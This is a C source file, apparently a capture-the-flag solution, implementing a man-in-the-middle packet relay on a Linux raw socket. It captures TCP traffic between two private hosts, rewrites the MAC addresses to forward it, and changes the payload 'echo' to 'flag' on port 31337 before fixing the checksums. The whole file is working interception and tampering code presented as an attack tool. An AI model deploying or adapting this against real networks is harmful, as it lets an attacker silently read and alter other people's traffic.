#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

static uint16_t csum16(const void *data, size_t len) {
    uint32_t sum = 0;
  const uint16_t *p = data;

  while (len >= 2) {
    sum += *p++;
    len -= 2;
  }
  if (len) {
    sum += *(const uint8_t *)p;
  }

  while (sum >> 16)
    sum = (sum & 0xffff) + (sum >> 16);

  return (uint16_t)(~sum);
}

static void fix_ip_checksum(struct iphdr *ip) {
    ip->check = 0;
    ip->check = csum16(ip, ip->ihl * 4);
}

static void fix_tcp_checksum(struct iphdr *ip, struct tcphdr *tcp) {
      size_t ip_hl = ip->ihl * 4;
    size_t tcp_len = ntohs(ip->tot_len) - ip_hl;

    tcp->check = 0;

    struct {
        uint32_t saddr;
        uint32_t daddr;
        uint8_t  zero;
        uint8_t  proto;
        uint16_t len;
    } ph;

    ph.saddr = ip->saddr;
    ph.daddr = ip->daddr;
    ph.zero  = 0;
    ph.proto = IPPROTO_TCP;
    ph.len   = htons(tcp_len);

    unsigned char tmp[2048];
    if (sizeof(ph) + tcp_len > sizeof(tmp)) return;

    size_t off = 0;
    memcpy(tmp + off, &ph, sizeof(ph)); off += sizeof(ph);
    memcpy(tmp + off, tcp, tcp_len);    off += tcp_len;

    tcp->check = csum16(tmp, off);
}

int main(void) {
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd < 0) { perror("socket"); return 1; }

    int ifidx = if_nametoindex("eth0");
    if (!ifidx) { perror("if_nametoindex"); return 1; }

    uint8_t my_mac[6] = {0x3e, 0xaf, 0x19, 0x5a, 0x02, 0xfb};
    uint8_t mac2[6]   = {0xfa, 0x10, 0xec, 0xe6, 0x16, 0xd0};
    uint8_t mac3[6]   = {0x76, 0x5d, 0xb2, 0xfa, 0xeb, 0x13};

    uint32_t ip2 = inet_addr("10.0.0.2");
    uint32_t ip3 = inet_addr("10.0.0.3");

    struct sockaddr_ll to = {0};
    to.sll_family   = AF_PACKET;
    to.sll_ifindex  = ifidx;
    to.sll_halen    = 6;

    uint8_t buf[2048];

    for (;;) {
        ssize_t n = recvfrom(fd, buf, sizeof(buf), 0, NULL, NULL);
        if (n < (ssize_t)(sizeof(struct ethhdr) + sizeof(struct iphdr))) continue;

        struct ethhdr *eth = (struct ethhdr *)buf;
        if (memcmp(eth->h_source, my_mac, 6) == 0) continue;
        if (ntohs(eth->h_proto) != ETH_P_IP) continue;

        struct iphdr *ip = (struct iphdr *)(buf + sizeof(*eth));
        if (ip->protocol != IPPROTO_TCP) continue;

        int dir_2_to_3 = (ip->saddr == ip2 && ip->daddr == ip3);
        int dir_3_to_2 = (ip->saddr == ip3 && ip->daddr == ip2);
        if (!dir_2_to_3 && !dir_3_to_2) continue;

        if (dir_2_to_3) {
            memcpy(eth->h_dest,   mac3, 6);
            memcpy(eth->h_source, my_mac, 6);
            memcpy(to.sll_addr,   mac3, 6);
        } else {
            memcpy(eth->h_dest,   mac2, 6);
            memcpy(eth->h_source, my_mac, 6);
            memcpy(to.sll_addr,   mac2, 6);
        }

        size_t ip_hl  = ip->ihl * 4;
        if (n < (ssize_t)(sizeof(*eth) + ip_hl + sizeof(struct tcphdr))) continue;

        struct tcphdr *tcp = (struct tcphdr *)((uint8_t*)ip + ip_hl);
        size_t tcp_hl = tcp->doff * 4;

        size_t ip_total = ntohs(ip->tot_len);
        if (ip_total < ip_hl + tcp_hl) continue;

        uint8_t *payload = (uint8_t*)tcp + tcp_hl;
        size_t payload_len = ip_total - ip_hl - tcp_hl;

	if (dir_2_to_3 && ntohs(tcp->dest) == 31337){
        if (payload_len >= 4 && memcmp(payload, "echo", 4) == 0) {
             memcpy(payload, "flag", 4);
             fprintf(stderr, "PATCH echo->flag\n");
         }
	}
        fix_ip_checksum(ip);
        fix_tcp_checksum(ip, tcp);

        if (sendto(fd, buf, n, 0, (struct sockaddr*)&to, sizeof(to)) < 0) {
            perror("sendto");
            return 1;
        }
    }
}
